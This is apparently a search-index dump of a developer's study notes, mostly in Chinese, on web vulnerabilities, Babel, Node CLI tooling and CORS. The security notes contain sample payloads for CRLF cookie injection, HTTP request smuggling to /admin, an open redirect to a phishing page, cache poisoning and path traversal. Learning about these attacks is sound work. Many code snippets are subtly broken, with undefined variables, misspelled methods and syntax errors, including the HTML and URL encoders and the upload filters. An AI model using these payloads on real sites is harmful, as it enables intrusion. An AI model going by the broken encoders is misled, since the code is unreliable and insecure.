Validation\u8f93\u5165\u9a8c\u8bc1","text":"<ul> <li>\u767d\u540d\u5355</li> <li>\u9ed1\u540d\u5355</li> <li>GeoFilter</li> <li>\u683c\u5f0f\u548c\u957f\u5ea6</li> </ul>"},{"location":"security/security/#output-encoding","title":"Output Encoding\u8f93\u51fa\u7f16\u7801","text":"<ul> <li> (symbol encoding)</li> </ul> <p>html entity template: <code>&amp;#&lt;decimal&gt;;</code> <code>&amp;#402;</code> or <code>&amp;fnof;</code> (unicode-dec)</p> <p>Unicode template:<code>U+&lt;Hex&gt;</code>, <code>U+1092</code> (unicode-hex)</p> <p>css content template <code>\\&lt;Hex&gt;</code> <code>\\1092</code> (unicode-hex)</p> <p>url Encoded: <code>%c6%92</code> (utf-8)</p> output_encoding.js<pre><code>  const currency = ['&amp;pound;','&amp;eurp','&amp;yen']\n  const deg = ['&amp;deg;'&amp;#8457;'], // Fahrenheit\n  const math = ['fnof;','&amp;infin;','&amp;percnt;']\nconst urlEncode = (str) =&gt; {\n  // &amp;fonf;(replacer)\n  str.replace(/['#;']/g, (match) =&gt; {\n    return '%' + c.charCodeAt(0).toString(16).toUppperCase()\n  }).\n}\n\nconst htmlEncode = (htmlString) =&gt; {\n  const escapeMap = new Map([\n      ['&lt;', '&amp;lt;'],\n      ['&gt;', '&amp;gt;'],\n      ['\"', '&amp;quot;'],\n      [\"'\", '&amp;#39;'],\n      ['(', '&amp;#40;'],\n      [')', '&amp;#41;'],\n      ['%', '&amp;#37;'],\n      ['+', '&amp;#43;'],\n      [',', '&amp;#44;']\n    ]);\n\n  //\n  const regex = new RegExp([...escapeMap.keys()].join('|'), 'g');\n\n  return str.replace(regex, match =&gt; escapeMap.get(match));\n</code></pre>"},{"location":"security/security/#csp","title":"CSP","text":"<p><code>Content-Security-Policy</code></p>"},{"location":"security/security/#web_3","title":"Web\u8de8\u57df\u6f0f\u6d1e","text":""},{"location":"security/security/#same-origin-policy","title":"\u540c\u6e90\u7b56\u7565same origin policy","text":"<p>\u8de8\u57df\u6280\u672f JSONP CORS\uff08cross-origin resource shared) postMessage() <pre><code>Access-Control-Allow-Origin:\nAccess-Control-Allow-Crendentials\nAccess-Control-Allow-Methods\nAccess-Control-Allow-Headers\nAccess-Control-Max-Age\n</code></pre></p> <p><code>X-Content-Type-Options:nosniff</code></p>"},{"location":"security/security/#clickjacking","title":"clickJacking","text":"<p><code>X-Frame-Options</code>: deny | sameorigin | allow-from"},{"location":"security/security/#csrf","title":"\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1eCSRF","text":""},{"location":"security/security/#over-permission","title":"over permission","text":""},{"location":"security/security/#remote-code-exection","title":"Remote code exection","text":"<p>playload:<code>cmd=archive&amp;target=&amp;type=</code> <code>cmd=upload</code></p>"},{"location":"security/security/#server-side-template-injection","title":"server side template injection","text":"<p><code>render_template()</code></p> <p>`</p> <p><code></code>eval()<code></code>document.write()`</p> <p>DNS query record</p>"},{"location":"security/security/#crlf","title":"CRLF\u6ce8\u5165\u6f0f\u6d1e","text":"<p>CRLF(\\r\\n)\uff0c\u5341\u516d\u8fdb\u5236\u7801\u4e3a0x0d,0x0a HTTP\u534f\u8bae\u4e2d\uff0cHTTP Header \u4e0e HTTP Body \u662fCRLF\u5206\u5272</p> <p>/%0a%0dSet-Cookie:%20session_id=123</p>"},{"location":"security/security/#_12","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"<ul> <li> <p> \u6587\u4ef6\u4e0a\u4f20\u76ee\u5f55\u8bbe\u4e3a\u4e0d\u53ef\u6267\u884c</p> </li> <li> <p> \u6587\u4ef6\u4e0a\u4f20\u7c7b\u578b(\u4e0d\u5141\u8bb8\u6076\u610f\u811a\u672c)\u6821\u9a8c\u7ed5\u8fc7 <pre><code>const allow_types = ['text/html', 'image/gif','application/zip','application/json', 'application/octet-stream']\n\nconst checkFile = file =&gt; {\n  if(!ALLOWED_TYPES.includes(file.type)) {\n    const errMsg =\"\u4e0d\u652f\u6301\u4e0a\u4f20\u8be5\u6587\u4ef6\u7c7b\u578b: \" + ext_name\n      message.error(errMsg)\n  }\n)\n}\n</code></pre></p> </li> <li> \u6587\u4ef6\u62d3\u5c55\u540d\u68c0\u6d4b\u7ed5\u8fc7 <pre><code>const allow_exts_name = '.gif|.jpg'\nconst checkFile = filename =&gt; {\n  const ext_name = file_substring(filename.lastIndexOf(\".\")\n    if(allow_exts_name.indexOf(ext_name) &lt; 0) {\n      const errMsg =\"\u4e0d\u652f\u6301\u4e0a\u4f20\u8be5\u6587\u4ef6\u7c7b\u578b: \" + ext_name\n        message.error(errMsg)\n    }\n}\n</code></pre></li> </ul>"},{"location":"security/security/#_13","title":"\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e","text":"<ul> <li> PATH TRAVERSAL\u8def\u5f84\u904d\u5386 ../../ \u8de8\u76ee\u5f55\u4e0b\u8f7d</li> </ul>"},{"location":"security/security/#web_4","title":"web\u7f13\u5b58","text":"<pre><code>X-Forwarded-Host: www.weakness.com\n</code></pre> <pre><code>X-Cache: miss\n</code></pre> <pre><code>X-Cache: hit\n</code></pre>"},{"location":"security/security/#hrshttp-request-smuggling","title":"HRS(http request smuggling)","text":"<ul> <li> <p> Content-Length \u6d88\u606f\u4f53\u957f\u5ea6(in bytes)</p> </li> <li> <p> Transfer-Encoding \u4f20\u8f93\u7f16\u7801</p> </li> </ul> <p><code>[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size=0][\\r\\n][\\r\\n]</code></p> <pre><code>Content-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore:\n</code></pre>"},{"location":"security/security/#url","title":"url\u8df3\u8f6c","text":"<p>playload: ?<code>url=http://x.x.x.x/fish.html</code></p>"},{"location":"security/security/#_14","title":"\u654f\u611f\u4fe1\u606f\u6cc4\u9732","text":"<p>\u7528\u6237\u540d\u8d26\u53f7\u5bc6\u7801 \u624b\u673a\u53f7/\u4f4f\u5740/\u4f59\u989d \u670d\u52a1\u5668\u914d\u7f6e \u6838\u5fc3\u6570\u636e</p>"},{"location":"security/security/#6","title":"6\u5927\u4e2d\u95f4\u4ef6\u6f0f\u6d1e","text":"<ul> <li>nginx</li> </ul>"},{"location":"security/security/#_15","title":"\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e","text":"<ul> <li> \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e Authentication \u5e38\u89c1web\u96c6\u4e2d\u8eab\u4efd\u8ba4\u8bc1\uff1a Digest\u3001 <pre><code>Authentication: `Bearer #f426`\n</code></pre> SSL Client\u3001Form</li> <li>\u8d8a\u6743\u6f0f\u6d1e</li> <li>\u652f\u4ed8\u6f0f\u6d1e</li> <li>\u77ed\u4fe1/\u90ae\u7bb1\u8f70\u70b8</li> <li> CAPTCHA(Completely Automated Public Turing test to tell Computers and Humans Apart)</li> <li>\u4e3b\u8981\u9632\u6b62\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u3001\u5237\u7968\u3001\u8bba\u575b\u704c\u6c34\u3001</li> <li>\u4e00\u822c\u5206\u4e3a\u56fe\u7247\u9a8c\u8bc1\u7801\u3001\u77ed\u4fe1\u9a8c\u8bc1\u7801</li> </ul>"},{"location":"security/security/#_16","title":"\u6570\u636e\u5e93\u6f0f\u6d1e","text":"<p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020-CSRF\u7684\u5371\u5bb3\u4e0e\u9632\u5fa1 \u793e\u4f1a\u5de5\u7a0b\u5b66\u653b\u51fb</p> <p>\u7f16\u7801(encoding) - Base64 - ASCII - URL - Hex - UTF-8 \" -&gt; %quote ' -&gt; ' &lt; -&gt; &lt;</p> <p>-&gt; %gt; / -&gt; % &amp; -&gt; %amp; - HEX \u52a0\u5bc6(Encryption) \u5bf9\u79f0\u52a0\u5bc6 - AES - DES \u975e\u5bf9\u6210\u52a0\u5bc6(\u516c\u94a5\u52a0\u5bc6\uff0c\u79c1\u94a5\u89e3\u5bc6\uff0c\u53ef\u4ee5\u53ef\u4ee5\u4f20\u8f93) - rsa - ed25519 hash digest\u54c8\u5e0c\u6563\u5217\u7b97\u6cd5(irreversible, collision resistant) -sha256,384,512 -md5 -REPEMD-160 -BLAKE2s</p>"},{"location":"security/security/#hmac","title":"HMAC","text":"<p>HMAC = Hash-based Message Authentication Code (MAC code, calculated using a cryptographic hash function):</p> <p>\u6587\u4ef6\u538b\u7f29\u683c\u5f0f .zip .tar</p> <ol> <li> <p>security on the web @MDN References &gt; security on the web\u00a0\u21a9</p> </li> <li> <p>symbol encoding @Toptal &gt; /designers/htmlarrows/\u00a0\u21a9</p> </li> <li> <p>Practical Cryptography for Developers \u21a9</p> </li> </ol>"},{"location":"tool-chain/","title":"Index","text":""},{"location":"tool-chain/#_1","title":"\u5f00\u53d1\u9636\u6bb5","text":"<p>\u811a\u624b\u67b6\u4e0eCLI \u5f00\u53d1\u89c4\u8303 \u516c\u5171\u5e93 \u5305\u7ba1\u7406\u5668 \u6784\u5efa\u5de5\u5177 \u8c03\u8bd5\u5de5\u5177</p>"},{"location":"tool-chain/#_2","title":"\u6d4b\u8bd5\u9636\u6bb5","text":"<p>\u6d4b\u8bd5\u6846\u67b6 \u9759\u6001\u626b\u63cf\u5de5\u5177 \u6027\u80fd\u6d4b\u8bd5\u5de5\u5177</p>"},{"location":"tool-chain/#_3","title":"\u6784\u5efa\u9636\u6bb5","text":"<p>build-pipeline \u4f18\u5316\u7b56\u7565 \u90e8\u7f72\u7b56\u7565</p>"},{"location":"tool-chain/#_4","title":"\u90e8\u7f72\u9636\u6bb5","text":"<p>\u6301\u7eed\u6784\u5efa \u9a8c\u8bc1\u6d4b\u8bd5</p>"},{"location":"tool-chain/#_5","title":"\u76d1\u63a7\u9636\u6bb5","text":"<p>\u57cb\u70b9</p>"},{"location":"tool-chain/#_6","title":"\u5f00\u53d1\u89c4\u8303","text":"<p>prettier playground</p>"},{"location":"tool-chain/babel/","title":"Babel","text":"<ul> <li>babel\u7684\u5b89\u88c5\u548c\u4f7f\u7528</li> </ul>"},{"location":"tool-chain/babel/#babelvia-cli","title":"babel\u7684\u547d\u4ee4\u884c\u4f7f\u7528(via cli)","text":""},{"location":"tool-chain/babel/#_1","title":"\u63d2\u4ef6\u7684\u4f7f\u7528","text":"<p><pre><code>npm i @babel/core @babel/cli -D\nnpm i @babel/plugin-transform-block-scope @babel/transform-arrow-functions -D\n</code></pre> <pre><code>npx babel ./src --out-dir ./dist --plugins=@babel/plugin-transform-block-scope,@babel/plugin-transform-arrow-functions\n</code></pre></p>"},{"location":"tool-chain/babel/#_2","title":"\u9884\u8bbe","text":"<pre><code>npm i @babel/preset -D\nnpx babel ./src --out-dir --presets=@babel/preset\n</code></pre>"},{"location":"tool-chain/babel/#babel-as-a-compiler","title":"babel as a compiler","text":"<p>AST Explorer source code -&gt; lexical analysis -&gt; tokens tokens -&gt; syntactic analysit -&gt; AST AST -&gt; Traversal -&gt; Vistor -&gt; Plugin -&gt; new AST new AST -&gt; code generation -&gt; target code</p>"},{"location":"tool-chain/babel/#babelwebpackw-configuration-file","title":"babel\u5728webpack\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u4f7f\u7528(w/ configuration file)","text":"<p>babel as a loader installattion <pre><code>npm install babel-loader @babel/core\n</code></pre></p> webpack.config.js<pre><code>module.exports = {\n  devtool: 'cheap-source-map',\n  output: {\n    path:path.resolve(__dirname,'./build'),\n    filename:'bundile.js',\n    clean: true\n  },\n  reslove:{\n    extensions:['.js','json','.jsx']\n  },\n  module:{\n    rules: [\n      {\n        test:/\\.ts$/,\n        exclude: /node_modules/,\n        use:'ts-loader'\n      },\n      {\n        test: /\\m?.js/,\n        // loader:'babel-loader'\n        exclude:/node_modules/,\n        use: {\n          loader:'babel-loader',\n          options: {\n            // plugins: [\n            //   \"@babel/plugin-transform-arrow-functions\",\n            //   \"@babel/plugin-transform-destructuring\",\n            //   \"@babel/plugin-transform-for-of\"\n            // ]\n            presets:[\n              [\n                \"@babel/preset-env\",\n                {\n                  targets: {\n                    \"edge\": \"17\",\"firefox\": \"60\", \"chrome\": \"67\",        \"safari\": \"11.1\"\n                  }\n                }\n              ],\n              [\n                \"@babel/preset-ract\"\n              ]\n          }\n        }\n      }\n    ]\n  }\n}\n</code></pre>"},{"location":"tool-chain/babel/#babel-plugins","title":"babel-plugins","text":""},{"location":"tool-chain/babel/#babel-preset","title":"babel-preset","text":"<p>webpack\u63d0\u4f9b\u4e00\u4e2a\u9884\u8bbe(preset),babel-loader\u4f1a\u6839\u636e\u6211\u4eec\u63d0\u4f9b\u7684\u9884\u8bbe\u52a0\u8f7d\u5305\u542b(included)\u5728\u8be5\u9884\u8bbe\u4e2d\u7684\u63d2\u4ef6\uff0c\u4f20\u9012\u7ed9<code>@babel/core</code>\u4e2d\u7684compiler</p> <p>\u5e38\u89c1\u7684\u9884\u8bbe\u6709\u4e09\u4e2a: <code>@babel/preset-env</code> <code>@babel/preset-react</code> <code>@babel/preset-typescript</code></p> <p>TC-39 process stage-0: Strawman stage-1: Proposal stage-2: Draft stage-3: Candidate stage-4: Finished</p>"},{"location":"tool-chain/babel/#_3","title":"\u6d4f\u89c8\u5668\u517c\u5bb9\u6027","text":"<p>\u6253\u5305\u7684\u4ee3\u7801\uff0c\u6700\u7ec8\u8981\u8dd1\u5728\u76ee\u6807\u6d4f\u89c8\u5668\u4e0a\uff0c\u5982\u4f55\u544a\u77e5babel\u6211\u4eec\u7684\u76ee\u6807\u6d4f\u89c8\u5668\u5462? - browserlist - target</p>"},{"location":"tool-chain/babel/#_4","title":"\u547d\u4ee4\u884c\u4e2d\u4f7f\u7528","text":"<p><code>browserlist</code>\u5e38\u89c1\u67e5\u8be2\u6761\u4ef6 <code>npx browerlist \"&gt; 1%, last 2 version, not dead\"</code> - Firefox &gt; 20 - not ie &lt;= 8 browserlist\u6761\u4ef6\u67e5\u8be2\u7528\u5230<code>caniuse-lite</code>\u5de5\u5177</p>"},{"location":"tool-chain/babel/#_5","title":"\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528","text":"<pre><code>  \"browserlist\":[\"&gt; 0.5%\", \"last 2 version\", \"not dead\"]\n</code></pre> .browserlistrc<pre><code>&gt; 1%\nlast 2 version\nnot dead\n</code></pre>"},{"location":"tool-chain/babel/#reactjsx","title":"react\u7684jsx\u652f\u6301","text":""},{"location":"tool-chain/babel/#typescript","title":"typescript\u7684\u652f\u6301","text":"<p>\u521b\u5efatypescript\u7f16\u8bd1\u914d\u7f6e\u6587\u4ef6tsconfig.json <pre><code>tsc --init\n</code></pre> - [x] hybrid approach: babel for transpelling, tsc for types checking</p> <p>@typescript &gt; handbook &gt; project configuration &gt; tsc cli options <pre><code>\"sripts\":{\n    \"type-check\": \"tsc --noEmit --watch\"\n}\n</code></pre></p>"},{"location":"tool-chain/cli/","title":"Cli","text":""},{"location":"tool-chain/cli/#cli-101","title":"Cli 101","text":""},{"location":"tool-chain/cli/#shell","title":"shell","text":"<p>shell provide interface to interact with other programs</p> <p></p> <p>to find the path of executable from env variable($PATH) <pre><code>which npm\n/Users/ayao/.nvm/versions/node/v22.4.1/bin/npm\n</code></pre> to find the path of built-in command <pre><code>ls /usr/bin | grep -w \"cd\"\ncd\n</code></pre></p> <ul> <li> bash and zsh as shell implementation</li> </ul> <pre><code>cat /etc/shells\n# List of acceptable shells for chpass(1).\n# Ftpd will not allow users to connect who are not using\n# one of these shells.\n\n/bin/bash\n/bin/csh\n/bin/dash\n/bin/ksh\n/bin/sh\n/bin/tcsh\n/bin/zsh\n</code></pre> <ul> <li> cli(text-based user interface) <p>clis accpet input command that are entered by keyboard</p> </li> </ul> <p>vendor of cli</p> <ul> <li>terminal in macos</li> <li>powershell in windows</li> </ul> <p>type of CLI commands include the following:</p> <ul> <li>executable programs</li> <li>batch programs</li> <li>system commands</li> </ul> <p>cli add-on feature</p> <ul> <li>Scripting capability</li> <li>Command pipes</li> <li>System variables</li> <li>Command history</li> </ul> <p></p>"},{"location":"tool-chain/cli/#cli-client-in-use","title":"cli client in use","text":""},{"location":"tool-chain/cli/#_1","title":"\u811a\u624b\u67b6\u5b9e\u73b0\u539f\u7406","text":"<p>vue.js w/ shebang</p> <pre><code>#!/usr/bin/env node\n</code></pre> <p><code>ln -s /path/to/file_or_directory path/to/symlink</code></p>"},{"location":"tool-chain/cli/#cli-framework","title":"cli framework","text":"<ul> <li>yargs</li> <li>gulp-cli</li> <li>rollup-cli(vie\u5e95\u5c42)</li> <li>create-vue scafold</li> <li>commander</li> <li>vue-cli</li> <li>wepack-cli</li> <li>create-react-app</li> <li>oclif(\u811a\u624b\u67b6\u751f\u6210)</li> </ul>"},{"location":"tool-chain/cli/#vue-dev-workflow","title":"vue dev workflow","text":"<p><code>node/bin</code></p>"},{"location":"tool-chain/cli/#_2","title":"\u672c\u5730\u8c03\u8bd5","text":"<ul> <li> <p> \u5168\u5c40\u5b89\u88c5\u53d1\u5e03\u4e0a\u7ebf\u7684\u811a\u624b\u67b6 <pre><code>npm i -g 4am\n</code></pre></p> </li> <li> <p> \u5168\u5c40\u5378\u8f7d\u4e0a\u7ebf\u7684\u811a\u624b\u67b6 <pre><code>npm remove -g 4am\n</code></pre></p> </li> <li> <p> symlink\u6307\u5411\u672c\u5730\u9879\u76ee</p> </li> <li> <p><code>npm link</code> in a package folder with no arguments will create a symlink in the global folder {prefix}/lib/node_modules/ that links to the package where the npm link command was executed. <li> <p>it will also link any bins in the package to {prefix}/bin/{name}. Note that npm link uses the global prefix (see npm prefix -g for its value).</p> </li> <pre><code>\u279c npm link\n\u279c bin ls -l Users/ayao/.nvm/versions/node/v22.4.1/bin/\nquarte -&gt; ../lib/node_modules/@quarte/cli/bin/cli.js\n\n\u279c tree  /Users/ayao/.nvm/versions/node/v22.4.1/lib/node_modules/ -L 2\n\u251c\u2500\u2500 @quarte\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 cli -&gt; ../../../../../../../project-clone/cli/4am/packages/cli\n</code></pre> <p><code>npm i 4am</code> \u5728\u5168\u5c40<code>node/lib/node_modules/&lt;pgk_name&gt;</code>\u627e\u5230\u5e93\u5305(scoped package)</p> <pre><code>\u279c  cli cd 4am\n\u279c  4am npm link\n\u279c  4am ls -la /Users/ayao/.nvm/versions/node/v22.4.1/lib/node_modules/\n4am -&gt; ~/project-clone/cli/4am\n\u279c  4am\ndebug setup\n</code></pre> <ul> <li> <p> \u5206\u5305</p> </li> <li> <p> \u5305\u7684\u53d1\u5e03\u4e0a\u7ebf <pre><code>npm login\nnpm publish\n</code></pre></p> </li> <li> <p> \u547d\u4ee4\u6ce8\u518c</p> </li> </ul> <pre><code>vue create\nvue invoke\n</code></pre>"},{"location":"tool-chain/cli/#_3","title":"\u53c2\u6570\u89e3\u6790","text":"<p><pre><code>vue command [options] &lt;params&gt;\n</code></pre> - \u53ef\u9009\u53c2\u6570 - \u5fc5\u9009\u53c2\u6570 - option fullname: <code>--version</code>, <code>--help</code> - option shorthand: <code>-V</code>, <code>-h</code> - option w/ params: <code>--path ~/projects/project-generator</code></p> <ul> <li> normalizeCommandLineOptions or Command-line argument parsing</li> </ul> <pre><code>const argv = process.argv.slice(process.argv.indexOf(\"init\") + 1)\n\n\nconst versions = []\n\nconst main = () =&gt; {\n  if(argv.length) return help()\n\n  while(argv.lenght) {\n    // --version=1.0.0\n    let option = argv.shift()\n    const idxOfEqualSign = option.indexOf(\"=\")\n    if(idxOfEqualSign &gt; -1) {\n      const val = option.slice(idxOfEqualSign + 1)\n      option = option.slice(0,idxOfEqualSign)\n      argv.unshift(val)\n    }\n  }\n\n  switch(option) {\n    case '-v': case '--version':\n      versions.push(argv.shift())\n      break\n  }\n}\n\nconst help = () =&gt; console.log(\n  `\n  A JavaScript implementation of the https://semver.org/ specification\n\n  Usage: semver [options] &lt;version&gt; [&lt;version&gt; [...]]\n\n  Options:\n  -r --range &lt;range&gt;\n          Print versions that match the specified range\n  `\n)\n\nmain()\n</code></pre>"},{"location":"tool-chain/cli/#colored-output","title":"colored output","text":""},{"location":"tool-chain/cli/#nodejs","title":"\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528node.js\u5f00\u53d1\u811a\u624b\u67b6?","text":"<ul> <li> node.js ecosystem</li> </ul> <p>built-in libs: fs, path, os, child_process 3<sup>rd</sup>-patry libs: commander, yargs, fs-extra, rxjs</p> <ul> <li> <p> \u5305\u7ba1\u7406\u7cfb\u7edf,\u53ef\u4ee5\u5feb\u901f\u5b8c\u5584cli\u53d1\u5e03\u66f4\u65b0</p> </li> <li> <p> chainable</p> </li> </ul> <pre><code>class Ora {\n  stop():this;\n  start(text?):this;\n  succeed(text): this;\n}\n</code></pre>"},{"location":"tool-chain/cli/#_4","title":"\u547d\u4ee4\u884c\u4ea4\u4e92","text":"<p>run to completion pause and resume</p>"},{"location":"tool-chain/cli/#nodejs_1","title":"node.js\u6700\u5148\u8fdb\u7684\u811a\u624b\u67b6\u8bbe\u8ba1\u7406\u5ff5\u548c\u5f00\u53d1\u65b9\u6cd5","text":""},{"location":"tool-chain/cli/#_5","title":"\u81ea\u4e3b\u642d\u5efa\u524d\u7aef\u811a\u624b\u67b6,\u8986\u76d6\u524d\u7aef\u7814\u53d1\u5168\u6d41\u7a0b","text":"<p>\u9879\u76ee\u521b\u5efa-&gt;\u9879\u76ee\u4e0b\u8f7d-&gt;\u9879\u76ee\u6d4b\u8bd5-&gt;\u9879\u76ee\u63d0\u4ea4-&gt;\u9879\u76ee\u53d1\u5e03</p> <p>\u9879\u76ee\u521b\u5efa\u81ea\u52a8\u5316</p> <p>\u9879\u76ee\u6a21\u7248\u914d\u7f6e</p> <p>\u9879\u76ee\u6e32\u67d3\u52a8\u6001\u5316</p> <p>\u5305\u4e0b\u8f7d</p> <p>\u4ee3\u7801\u89c4\u8303\u68c0\u67e5\u5de5\u5177</p> <p>\u4ee3\u7801\u81ea\u52a8\u5316\u6d4b\u8bd5\u5de5\u5177</p>"},{"location":"tool-chain/cli/#_6","title":"\u660e\u661f\u7ea7\u811a\u624b\u67b6\u6e90\u7801\u89e3\u8bfb","text":""},{"location":"tool-chain/cli/#create-vue","title":"create-vue","text":"<pre><code>function toValidProjectName(projectName) {\n  return projectName.\n    .toLowerCase()\n    .trim()\n    .replace(/^[\\._]/,\"\")\n    .replace(/\\s+/g, \"-\")\n    .replace([^a-z0-9-], \"-\")\n}\n</code></pre>"},{"location":"tool-chain/cli/#_7","title":"\u524d\u7aef\u811a\u624b\u67b6\u9762\u8bd5\u9898","text":""},{"location":"tool-chain/cli/#debugcli","title":"\u901a\u8fc7debug\u7684\u65b9\u5f0f\u9605\u8bfbcli\u6846\u67b6\u6e90\u7801","text":""},{"location":"tool-chain/cli/#_8","title":"\u811a\u624b\u67b6\u6846\u67b6\u5c01\u88c5","text":""},{"location":"tool-chain/cli/#_9","title":"\u811a\u624b\u67b6\u901a\u7528\u6846\u67b6\u5f00\u53d1\u6d41\u7a0b","text":"<ul> <li>\u521d\u59cb\u5316</li> <li>\u547d\u4ee4\u6ce8\u518c\u548c\u6267\u884c</li> <li>\u81ea\u52a8\u5316\u6d4b\u8bd5</li> </ul>"},{"location":"tool-chain/cli/#_10","title":"\u521d\u59cb\u5316","text":"<p>\u901a\u8fc7lerna\u521b\u5efapackage</p> <pre><code>packages\n- cli # \u811a\u624b\u67b6\u5165\u53e3\n- command #\u547d\u4ee4\u6ce8\u518c\u548c\u53c2\u6570\u89e3\u6790\n- init # \u9879\u76ee\u521d\u59cb\u5316\n- utils # \u901a\u8fc7\u5de5\u5177\u7c7b\n</code></pre>"},{"location":"tool-chain/cli/#_11","title":"\u547d\u4ee4\u6ce8\u518c\u548c\u6267\u884c","text":"<ul> <li>commander\u6846\u67b6</li> <li>\u5c01\u88c5\u901a\u7528command\u7c7b</li> <li>\u57fa\u4e8ecommand\u6d3e\u751f\u51fainitCommand</li> <li>\u547d\u4ee4\u7684\u6ce8\u518c\u548c\u6267\u884c</li> <li>cjs\u548cesm\u6df7\u5408\u5f00\u53d1\u7684\u95ee\u9898</li> </ul>"},{"location":"tool-chain/cli/#_12","title":"\u81ea\u52a8\u5316\u6d4b\u8bd5","text":"<ul> <li>jest = \u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\u7684\u517c\u5bb9\u6027\u95ee\u9898</li> </ul>"},{"location":"tool-chain/cli/#project-generator","title":"\u9879\u76ee\u9879\u76ee\u521b\u5efa\u811a\u624b\u67b6\uff08project generator)","text":""},{"location":"tool-chain/cli/#_13","title":"\u6838\u5fc3\u4f9d\u8d56\u5e93\uff1a","text":"<p>\u4ea4\u4e92 - commander: \u547d\u4ee4\u6ce8\u518c\u548c\u53c2\u6570\u89e3\u6790\uff0c\u7528\u4e8e\u5904\u7406\u8f93\u5165\u547d\u4ee4 - inquirer: \u901a\u7528\u7684\u547d\u4ee4\u884c\u7528\u6237\u754c\u9762\u96c6\u5408\uff0c\u7528\u4e8e\u548c\u7528\u6237\u8fdb\u884c\u4ea4\u4e92</p> <p>\u6837\u5f0f\u548c\u52a8\u753b - chalk colored output - ora terminal spinner, loading indicator - log-symbols:Colored symbols</p> <p>\u6a21\u7248 - download-git-repo \u62c9\u53d6\u5b58\u653e\u5728git\u4ed3\u5e93\u4e2d\u7684\u9879\u76ee\u6a21\u7248 - handlebars.js  \u6a21\u677f\u5f15\u64ce\uff0c\u5c06\u7528\u6237\u63d0\u4ea4\u7684\u4fe1\u606f\u52a8\u6001\u586b\u5145\u5230\u6587\u4ef6\u4e2d - \u4ecenpm register\u62c9\u53d6\u9879\u76ee\u6a21\u7248</p>"},{"location":"tool-chain/cli/#_14","title":"\u914d\u7f6e\u9879\u76ee\u6a21\u7248","text":"<ul> <li> node\u7248\u672c\u68c0\u6d4b <pre><code>{\n  \"engines\": {\n    \"node\": \"^12.0.0 || &gt;= 14.0.0\"\n  }\n}\n</code></pre></li> </ul> <pre><code>function checkVersion(processVersion, requiredVersion) {\n  if(!semver.satisfies(processVersion,requiredVersion, {incluePrelease: true})){\n\n  }\n  process.exit(1)\n}\n</code></pre> env.js<pre><code>//{\"os\": \"darwin\", \"arch\": \"arm64\"}\n//{\"os\": \"darwin\", \"arch\": \"x86_64\"}\n\n// os\nexports.isWindows = process.platform === 'win32'\nexports.isMacintosh = process.platform === 'darwin'\nexports.isLinux = process.platform === 'linux'\n</code></pre> <ol> <li> <p>@npm Docs &gt; npm CLI &gt; #Using npm,# configuring npm, CLI Commands  \u21a9</p> </li> </ol>"},{"location":"tool-chain/cors/","title":"Cors","text":""},{"location":"tool-chain/cors/#_1","title":"\u6e90","text":"<p>[protocol,port,host]\u5143\u7ec4</p>"},{"location":"tool-chain/cors/#_2","title":"\u540c\u6e90\u7b56\u7565","text":"<p>\u5982\u679c\u4e24\u4e2aurl\u7684protocol\u3001port \u548c host\u90fd\u76f8\u540c\uff0c\u5219\u5b83\u4eec\u662f\u540c\u6e90\u7684</p>"},{"location":"tool-chain/cors/#_3","title":"\u8de8\u57df","text":"<p>\u524d\u540e\u7aef\u5206\u79bb\u7684\u67b6\u6784\u4e2d\u9759\u6001\u8d44\u6e90\u670d\u52a1\u5668\u548cAPI\u63a5\u53e3\u670d\u52a1\u5668\u5f80\u5f80\u4e0d\u662f\u540c\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u4e0d\u662f\u540c\u4e00\u4e2a\u63a5\u53e3</p>"},{"location":"tool-chain/cors/#resouce-loading","title":"resouce loading","text":"<p>The browser allows us to track the loading of external resources \u2013 scripts, iframes, pictures and so on.</p> <p>There are two events for it:</p> <p>onload \u2013 successful load, onerror \u2013 an error occurred.</p> <p>When the browser loads HTML and comes across a  tag, it can\u2019t continue building the DOM. It must execute the script right now. The same happens for external scripts : the browser must wait for the script to download, execute the downloaded script, and only then can it process the rest of the page.</p> <ul> <li> that leads to two issues: 1.scirpt can't see DOM elements(DOM parse pause), so they can add handlers 2.If there\u2019s a bulky script at the top of the page, it \u201cblocks the page\u201d. Users can\u2019t see the page content till it downloads and runs: <code>&lt;script async&gt;</code> <code>&lt;script defer&gt;</code></li> </ul> <p>No <code>crossorigin</code> attribute \u2013 access prohibited.</p> <p><code>crossorigin=\"anonymous\"</code> \u2013 access allowed if the server responds with the header Access-Control-Allow-Origin with * or our origin. Browser does not send authorization information and cookies to remote server.</p> <p><code>crossorigin=\"use-credentials\"</code> \u2013 access allowed if the server sends back the header Access-Control-Allow-Origin with our origin and Access-Control-Allow-Credentials: true. Browser sends authorization information and cookies to remote server.</p> <pre><code>&lt;script crossorigin=\"use-credentials\"/&gt;\n</code></pre>"},{"location":"tool-chain/cors/#_4","title":"\u8de8\u57df\u89e3\u51b3\u65b9\u6848","text":"<p>\u5c06\u9759\u6001\u8d44\u6e90\u90e8\u7f72\u5728\u548cAPI\u63a5\u53e3\u6240\u5728\u670d\u52a1\u5668\uff0c\u5c31\u4e0d\u4f1a\u4ea7\u751f\u8de8\u57df\u95ee\u9898 cors \u670d\u52a1\u5668\u6807\u8bc6\u9664\u81ea\u5df1\u4ee5\u5916\u8fd8\u6709\u54ea\u4e9b\u6e90\u5916\u53ef\u4ee5\u8bbf\u95ee\u670d\u52a1\u5668\u4e2d\u7684\u8d44\u6e90</p> <p><pre><code>app.use((ctx,next)=&gt;{\n  ctx.set('Access-Control-Allow-Origin', 'http://localhost:*')\n  ctx.set('Access-Control-Allow-Crendentials', true)\n  ctx.set('Access-Control-Allow-Headers', 'Connection')\n  ctx.set('Access-Control-Allow-Methods', 'Get,Post')\n})\n</code></pre> 